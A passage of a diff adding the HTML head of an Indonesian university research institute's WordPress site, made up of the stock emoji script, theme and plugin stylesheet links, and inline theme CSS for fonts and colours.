@@ -1,0 +1,1485 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="profile" href="https://gmpg.org/xfn/11">
+
+<title>Lembaga Penelitian &#8211; Universitas Islam Sumatera Utara</title>
+<meta name='robots' content='max-image-preview:large' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="Lembaga Penelitian &raquo; Feed" href="https://lp.uisu.ac.id/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Lembaga Penelitian &raquo; Umpan Komentar" href="https://lp.uisu.ac.id/comments/feed/" />
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https://s.w.org/images/core/emoji/15.0.3/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/15.0.3/svg/","svgExt":".svg","source":{"concatemoji":"https://lp.uisu.ac.id/wp-includes/js/wp-emoji-release.min.js?ver=6.7.1"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"ud83cudff3ufe0fu200du26a7ufe0f","ud83cudff3ufe0fu200bu26a7ufe0f")?!1:!n(e,"ud83cuddfaud83cuddf3","ud83cuddfau200bud83cuddf3")&&!n(e,"ud83cudff4udb40udc67udb40udc62udb40udc65udb40udc6eudb40udc67udb40udc7f","ud83cudff4u200budb40udc67u200budb40udc62u200budb40udc65u200budb40udc6eu200budb40udc67u200budb40udc7f");case"emoji":return!n(e,"ud83dudc26u200du2b1b","ud83dudc26u200bu2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<link rel='stylesheet' id='iziModal-css' href='https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/post-format/assets/css/iziModal.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='parallax-css' href='https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/css/parallax.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='tf-animated-css' href='https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/css/tf-animated.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/bootstrap.css?ver=1' type='text/css' media='all' />
+<style id='wp-emoji-styles-inline-css' type='text/css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='contact-form-7-css' href='https://lp.uisu.ac.id/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=6.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wbg-selectize-css' href='https://lp.uisu.ac.id/wp-content/plugins/wp-books-gallery/assets/css/selectize.bootstrap3.min.css?ver=4.6.8' type='text/css' media='' />
+<link rel='stylesheet' id='wbg-font-awesome-css' href='https://lp.uisu.ac.id/wp-content/plugins/wp-books-gallery/assets/css/fontawesome/css/all.min.css?ver=4.6.8' type='text/css' media='' />
+<link rel='stylesheet' id='wbg-front-css' href='https://lp.uisu.ac.id/wp-content/plugins/wp-books-gallery/assets/css/wbg-front.css?ver=4.6.8' type='text/css' media='' />
+<link rel='stylesheet' id='wordpress-file-upload-style-css' href='https://lp.uisu.ac.id/wp-content/plugins/wp-file-upload/css/wordpress_file_upload_style.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wordpress-file-upload-style-safe-css' href='https://lp.uisu.ac.id/wp-content/plugins/wp-file-upload/css/wordpress_file_upload_style_safe.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wordpress-file-upload-adminbar-style-css' href='https://lp.uisu.ac.id/wp-content/plugins/wp-file-upload/css/wordpress_file_upload_adminbarstyle.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='jquery-ui-css-css' href='https://lp.uisu.ac.id/wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui.min.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='jquery-ui-timepicker-addon-css-css' href='https://lp.uisu.ac.id/wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui-timepicker-addon.min.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='themesflat-theme-slug-fonts-css' href='https://fonts.googleapis.com/css?family=Jost%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2Cregular%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C700%7CJost%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C500%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C500%7CJost%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C400%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C400%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C700%7CJost%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C400%7CJost%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C400%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C700%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C700%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C700%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C700%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C700%7CJost%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C500%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C700%7CJost%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C400%7CCatamaran%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C400%7CArimo%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C400%7CCatamaran%3A100%2C200%2C300%2C400%2C500%2C600%2C700%2C900%2C400' type='text/css' media='all' />
+<link rel='stylesheet' id='icon-labaid-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/icon-labaid.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='star-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/star.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='owl-carousel-css' href='https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/css/owl.carousel.min.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='themesflat-animated-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/animated.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='themesflat-main-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/main.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='themesflat-inline-css-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/inline-css.css?ver=6.7.1' type='text/css' media='all' />
+<style id='themesflat-inline-css-inline-css' type='text/css'>
+#themesflat-content{padding-top:120px; padding-bottom:0px; }
+.themesflat-top .container-inside{padding-top:15px; padding-bottom:11px; }
+#header #logo{}
+#footer{padding-top:113px; padding-bottom:101px; }
+.themesflat-partner-box{padding-top:67px; padding-bottom:120px; }
+.page-title{padding-top:98px; padding-bottom:95px; }
+body,button,input,select,textarea { font-family:Jost;}
+.blog-single .entry-content .icon-list { font-family:Jost!important;}
+body,button,input,select,textarea { font-weight:400;}
+body,button,input,select,textarea { font-style:normal; }
+body,button,input,select,textarea { font-size:16px; }
+body,button,input,select,textarea { line-height:1.875;}
+body,button,input,select,textarea { letter-spacing:0px;}
+h1,h2,h3,h4,h5,h6 { font-family:Arimo;}
+h1,h2,h3,h4,h5,h6 { font-weight:700;}
+h1,h2,h3,h4,h5,h6 { line-height:1.333;}
+h1,h2,h3,h4,h5,h6 { letter-spacing:0px;}
+h1,h2,h3,h4,h5,h6  { font-style:normal; }
+h1 { font-size:50px; }
+h2 { font-size:32px; }
+h3 { font-size:28px; }
+h4 { font-size:24px; }
+h5 { font-size:20px; }
+h6 { font-size:16px; }
+#mainnav > ul > li > a, .header-modal-menu-left-btn .text, header .flat-information li { font-family:Jost;}
+#mainnav > ul > li > a, .header-modal-menu-left-btn .text { font-weight:500;}
+#mainnav > ul > li > a, .header-modal-menu-left-btn .text  { font-style:normal; }
+#mainnav ul li a, .header-modal-menu-left-btn .text, header .flat-information li { font-size:14px;}
+#mainnav > ul > li > a, #header .show-search, header .block a, #header .mini-cart-header .cart-count, #header .mini-cart .cart-count, .button-menu { line-height:60px;}
+#header.header-sticky #mainnav > ul > li > a, #header.header-sticky .show-search a, #header.header-sticky .block a, #header.header-sticky .mini-cart-header .cart-count, #header.header-sticky .mini-cart .cart-count, #header.header-sticky .button-menu { line-height:calc(60px / 1.2);}
+#mainnav > ul > li > a, #header .show-search a, header .block a, #header .mini-cart-header .cart-count, #header .mini-cart .cart-count, .button-menu { letter-spacing:0px;}
+#mainnav ul.sub-menu > li > a { font-family:Arimo;}
+#mainnav ul.sub-menu > li > a { font-weight:500;}
+#mainnav ul.sub-menu > li > a  { font-style:normal; }
+#mainnav ul.sub-menu > li > a { font-size:14px;}
+#mainnav ul.sub-menu > li > a { line-height:26px;}
+#mainnav ul.sub-menu > li > a { letter-spacing:0px;}
+blockquote { font-family:Arimo;}
+blockquote { font-weight:400;}
+blockquote { font-style:normal; }
+blockquote { font-size:16px;}
+blockquote { line-height:30px;}
+blockquote { letter-spacing:0px;}
+article .entry-title { font-family:Arimo;}
+article .entry-title { font-weight:700;}
+article .entry-title { font-style:normal; }
+article .entry-title { font-size:32px;}
+article .entry-title { line-height:1.333;}
+article .entry-title { letter-spacing:0px;}
+article .post-meta .item-meta { font-family:Jost;}
+article .post-meta .item-meta { font-weight:400;}
+article .post-meta .item-meta { font-style:normal; }
+article .post-meta .item-meta { font-size:14px;}
+article .post-meta .item-meta { line-height:1.142;}
+article .post-meta .item-meta { letter-spacing:0px;}
+article .themesflat-button { font-family:Jost;}
+article .themesflat-button { font-weight:400;}
+article .themesflat-button { font-style:normal; }
+article .themesflat-button { font-size:14px;}
+article .themesflat-button { line-height:1;}
+article .themesflat-button { letter-spacing:0px;}
+.single article .entry-title { font-family:Arimo;}
+.single article .entry-title { font-weight:700;}
+.single article .entry-title { font-style:normal; }
+.single article .entry-title { font-size:32px;}
+.single article .entry-title { line-height:1.333;}
+.single article .entry-title { letter-spacing:0px;}
+.comment-title, .comment-reply-title, .comment-reply-title a { font-family:Arimo;}
+.comment-title, .comment-reply-title, .comment-reply-title a { font-weight:700;}
+.comment-title, .comment-reply-title, .comment-reply-title a { font-style:normal; }
+.comment-title, .comment-reply-title, .comment-reply-title a { font-size:28px;}
+.comment-title, .comment-reply-title, .comment-reply-title a { line-height:1.5;}
+.comment-title, .comment-reply-title, .comment-reply-title a { letter-spacing:0px;}
+.sidebar .widget .widget-title, .sidebar .widget h2, .sidebar .wp-block-search .wp-block-search__label, .sidebar .wc-block-product-search .wc-block-product-search__label { font-family:Arimo;}
+.sidebar .widget .widget-title, .widget h2, .sidebar .wp-block-search .wp-block-search__label, .sidebar .wc-block-product-search .wc-block-product-search__label { font-weight:700;}
+.sidebar .widget .widget-title, .widget h2, .sidebar .wp-block-search .wp-block-search__label, .sidebar .wc-block-product-search .wc-block-product-search__label { font-style:normal; }
+.sidebar .widget .widget-title, .widget h2, .sidebar .wp-block-search .wp-block-search__label, .sidebar .wc-block-product-search .wc-block-product-search__label { font-size:20px;}
+.sidebar .widget .widget-title, .widget h2, .sidebar .wp-block-search .wp-block-search__label, .sidebar .wc-block-product-search .wc-block-product-search__label { line-height:1.5;}
+.sidebar .widget .widget-title, .widget h2, .sidebar .wp-block-search .wp-block-search__label, .sidebar .wc-block-product-search .wc-block-product-search__label { letter-spacing:0px;}
+footer .widget .widget-title, footer .widget h2, footer .wp-block-search .wp-block-search__label { font-family:Arimo;}
+footer .widget .widget-title, footer .widget h2, footer .wp-block-search .wp-block-search__label { font-weight:700;}
+footer .widget .widget-title, footer .widget h2, footer .wp-block-search .wp-block-search__label { font-style:normal; }
+footer .widget .widget-title, footer .widget h2, footer .wp-block-search .wp-block-search__label { font-size:20px;}
+footer .widget .widget-title, footer .widget h2, footer .wp-block-search .wp-block-search__label { line-height:1.5;}
+footer .widget .widget-title, footer .widget h2, footer .wp-block-search .wp-block-search__label { letter-spacing:0px;}
+.page-title .page-title-heading { font-family:Arimo;}
+.page-title .page-title-heading { font-weight:700;}
+.page-title .page-title-heading { font-style:normal; }
+.page-title .page-title-heading { font-size:50px;}
+.page-title .page-title-heading { line-height:1.14;}
+.page-title .page-title-heading { letter-spacing:0px;}
+.breadcrumbs, .breadcrumbs span a, .breadcrumbs a, .breadcrumbs span { font-family:Jost;}
+.breadcrumbs, .breadcrumbs span a, .breadcrumbs a, .breadcrumbs span { font-weight:500;}
+.breadcrumbs, .breadcrumbs span a, .breadcrumbs a, .breadcrumbs span { font-style:normal; }
+.breadcrumbs, .breadcrumbs span a, .breadcrumbs a, .breadcrumbs span { font-size:16px;}
+.breadcrumbs, .breadcrumbs span a, .breadcrumbs a, .breadcrumbs span { line-height:1.875;}
+.breadcrumbs, .breadcrumbs span a, .breadcrumbs a, .breadcrumbs span { letter-spacing:0px;}
+.themesflat-button, button, input[type="button"], input[type="reset"], input[type="submit"] { font-family:Arimo;}
+.themesflat-button, button, input[type="button"], input[type="reset"], input[type="submit"] { font-weight:700;}
+.themesflat-button, button, input[type="button"], input[type="reset"], input[type="submit"] { font-style:normal; }
+.themesflat-button, button, input[type="button"], input[type="reset"], input[type="submit"] { font-size:16px;}
+.themesflat-button, button, input[type="button"], input[type="reset"], input[type="submit"] { line-height:1;}
+.themesflat-button, button, input[type="button"], input[type="reset"], input[type="submit"] { letter-spacing:0px;}
+.navigation a, .pagination > span, .navigation.paging-navigation span, .page-links a, .page-links > span, .woocommerce-pagination ul li span, .woocommerce-pagination ul li a { font-family:Jost;}
+.navigation a, .pagination > span, .navigation.paging-navigation span, .page-links a, .page-links > span, .woocommerce-pagination ul li span, .woocommerce-pagination ul li a { font-weight:400;}
+.navigation a, .pagination > span, .navigation.paging-navigation span, .page-links a, .page-links > span, .woocommerce-pagination ul li span, .woocommerce-pagination ul li a { font-style:normal; }
+.navigation a, .pagination > span, .navigation.paging-navigation span, .page-links a, .page-links > span, .woocommerce-pagination ul li span, .woocommerce-pagination ul li a { font-size:14px;}
+.navigation a, .pagination > span, .navigation.paging-navigation span, .page-links a, .page-links > span, .woocommerce-pagination ul li span, .woocommerce-pagination ul li a { line-height:1;}
+.navigation a, .pagination > span, .navigation.paging-navigation span, .page-links a, .page-links > span, .woocommerce-pagination ul li span, .woocommerce-pagination ul li a { letter-spacing:0px;}
+.copyright { font-family:Catamaran;}
+.copyright { font-weight:400;}
+.copyright { font-style:normal; }
+.copyright { font-size:16px;}
+.copyright { line-height:1.5;}
+.bottom { font-family:Catamaran;}
+.bottom { font-weight:400;}
+.bottom { font-style:normal; }
+.bottom { font-size:16px;}
+.bottom { line-height:1.75;}
+.bottom { letter-spacing:0px;}
+.themesflat-top { background-color:#fff ; } 
+.themesflat-top { color:#9AA5B3 ;} 
+.themesflat-top a { color:#9AA5B3 ;} 
+.themesflat-top a:hover { color:#3764EB ;} 
+.themesflat-top { font-family:Jost;}
+.themesflat-top { font-weight:400;}
+.themesflat-top { font-style:normal; }
+.themesflat-top { font-size:14px;}
+.themesflat-top { line-height:1.5;}
+#header.header-default .inner-header, #header.header-style1 .inner-header, #header.header-style2 .inner-header, #header.header-style3 .inner-header { background:#ffffff;}
+#header.header-default .inner-header-menu, #header.header-style1 .inner-header-menu, #header.header-style2 .inner-header-menu, #header.header-style4 .inner-header-menu{ background:#3764EB;}
+#header.header-sticky { background:#fff;}
+#mainnav > ul > li > a, .header-modal-menu-left-btn .text, header .flat-information li, header .flat-information li a { color:#FFFFFF;}
+.header-modal-menu-left-btn .modal-menu-left-btn .line { background:#FFFFFF;}
+#mainnav > ul > li > a:hover { color:#FEE100;}
+#mainnav > ul > li > a:after { background:#FEE100;}
+#mainnav > ul > li.current-menu-item > a, #mainnav > ul > li.current-menu-ancestor > a, #mainnav > ul > li.current-menu-parent > a { color:#FEE100;}
+#mainnav > ul > li.current-menu-item > a:after, #mainnav > ul > li.current-menu-ancestor > a:after, #mainnav > ul > li.current-menu-parent > a:after { background:#FEE100;}
+#mainnav ul.sub-menu > li > a, #mainnav li.megamenu > ul.sub-menu > .menu-item-has-children > a { color:#1B1D21;}
+#mainnav ul.sub-menu { background-color:#ffffff;}
+#mainnav ul.sub-menu > li > a:hover, #mainnav ul.sub-menu > li.current-menu-item > a, #mainnav-mobi ul li.current-menu-item > a, #mainnav-mobi ul li.current-menu-ancestor > a, #mainnav ul.sub-menu > li.current-menu-ancestor > a, #mainnav-mobi ul li .current-menu-item > a, #mainnav-mobi ul li.current-menu-item .btn-submenu:before, #mainnav-mobi ul li .current-menu-item .btn-submenu:before { color:#005DE0;}
+#mainnav ul.sub-menu > li > a:before { background-color:rgba(255,255,255,0);}
+#mainnav ul.sub-menu > li { border-top-color:#e8e8e900;}
+#header #logo a img, .modal-menu__panel-footer .logo-panel a img { max-width:211px;height: auto;}
+#mainnav > ul > li { margin-left:15px; margin-right:15px;}
+.footer_background { background:#142441;}
+#footer .widget-title, #footer h2, #footer h3, #footer h4, #footer h5, #footer h6, #footer .wp-block-search .wp-block-search__label { color:#ffffff;}
+#footer, #footer a, footer .widget.widget-recent-news li .text .post-date,  #footer .footer-widgets .widget.widget_themesflat_socials ul li a, footer select option, footer .widget.widget_recent_entries ul li .post-date, #footer .wp-block-latest-posts__post-author, #footer .wp-block-latest-posts__post-date { color:rgba(255,255,255,0.8);}
+#footer a:hover { color:#FEE100;}
